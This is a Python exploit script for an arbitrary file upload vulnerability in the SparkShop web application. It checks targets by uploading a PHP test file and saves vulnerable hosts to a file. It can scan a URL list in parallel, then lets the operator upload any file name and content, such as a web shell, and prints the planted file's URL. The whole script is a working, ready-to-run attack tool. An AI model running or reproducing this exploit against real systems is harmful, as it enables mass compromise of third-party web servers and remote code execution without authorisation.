# -*- coding: utf-8 -*-

import argparse,requests,json,sys
from multiprocessing.pool import Pool

requests.packages.urllib3.disable_warnings()
def banner():
    test = """
    ██╗     ██╗   ██╗ █████╗ ███╗   ██╗███╗   ███╗ █████╗  ██████╗ ██████╗ ██████╗ ███████╗
   ██║     ██║   ██║██╔══██╗████╗  ██║████╗ ████║██╔══██╗██╔════╝██╔═══██╗██╔══██╗██╔════╝
  ██║     ██║   ██║███████║██╔██╗ ██║██╔████╔██║███████║██║     ██║   ██║██║  ██║█████╗  
 ██║     ██║   ██║██╔══██║██║╚██╗██║██║╚██╔╝██║██╔══██║██║     ██║   ██║██║  ██║██╔══╝  
███████╗╚██████╔╝██║  ██║██║ ╚████║██║ ╚═╝ ██║██║  ██║╚██████╗╚██████╔╝██████╔╝███████╗
╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝
        """
    print(test)
def poc(target):
    payload = '/api/Common/uploadFile'
    headers = {
        "User-Agent": "Mozilla/5.0(Macintosh;IntelMacOSX10_15_7)AppleWebKit/537.36(KHTML,likeGecko)Chrome/127.0.0.0Safari/537.36",
        "Content-Type": "multipart/form-data;boundary=----WebKitFormBoundaryj7OlOPiiukkdktZR",
        "Content-Length": "176",
    }
    data = '------WebKitFormBoundaryj7OlOPiiukkdktZR\r\nContent-Disposition: form-data; name=\"file\";filename=\"1.php\"\r\n\r\n<?php echo"hello world";?>\r\n------WebKitFormBoundaryj7OlOPiiukkdktZR--'
    try:
        res = requests.post(target+payload, data=data, headers=headers, verify=False,timeout=5)
        if res.status_code == 200 and 'upload success' in res.text:
            with open('output.txt','a',encoding='utf-8') as f:
                f.write(f'{target}\n')
            print(f"[+]{target}存在文件上传漏洞")
            exp(target)
        else:
            print(f"[-]{target}不存在文件上传漏洞")
    except Exception as e:
        print(f"[-]{target}出问题了")
def exp(target):
    print("---------------------------------正在一键注入--------------------------------")
    payload = '/api/Common/uploadFile'
    headers = {
        "User-Agent": "Mozilla/5.0(Macintosh;IntelMacOSX10_15_7)AppleWebKit/537.36(KHTML,likeGecko)Chrome/127.0.0.0Safari/537.36",
        "Content-Type": "multipart/form-data;boundary=----WebKitFormBoundaryj7OlOPiiukkdktZR",
        "Content-Length": "176",
    }
    filename = input('请输入文件名:')
    code = input('文件内容')
    data = '------WebKitFormBoundaryj7OlOPiiukkdktZR\r\nContent-Disposition: form-data; name=\"file\";filename=\"'+f'{filename}'+'\"\r\n\r\n'+f'{code}'+'\r\n------WebKitFormBoundaryj7OlOPiiukkdktZR--'
    res1 = requests.post(target+payload, data=data, headers=headers, verify=False,timeout=5)
    if res1.status_code == 200 and 'upload success' in res1.text:
        json_start = res1.text.find('{')
        if json_start != -1:
            json_str = res1.text[json_start:]
            data = json.loads(json_str)
            url = data['data']['url']
            url1 = url.replace('\\','')
        print(f'{filename}上传成功,请访问{url1}')
    else:
        print(f"[-]{target}不存在文件上传漏洞")

def main():
    banner()
    parse = argparse.ArgumentParser(description="南京星源图科技_SparkShop_任意文件上传漏洞")
    parse.add_argument("-u","--url",dest="url",type=str,help="Please enter url")
    parse.add_argument("-f","--file",dest="file",type=str,help="Please enter file")
    args = parse.parse_args()
    url_list = []
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file,'r',encoding="utf-8") as f:
            for url in f.readlines():
                url = url.strip()
                url_list.append(url.replace('\n',''))
        mp = Pool(10)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage: python {sys.argv[0]} -h or --help for help")

if __name__ == '__main__':
    main()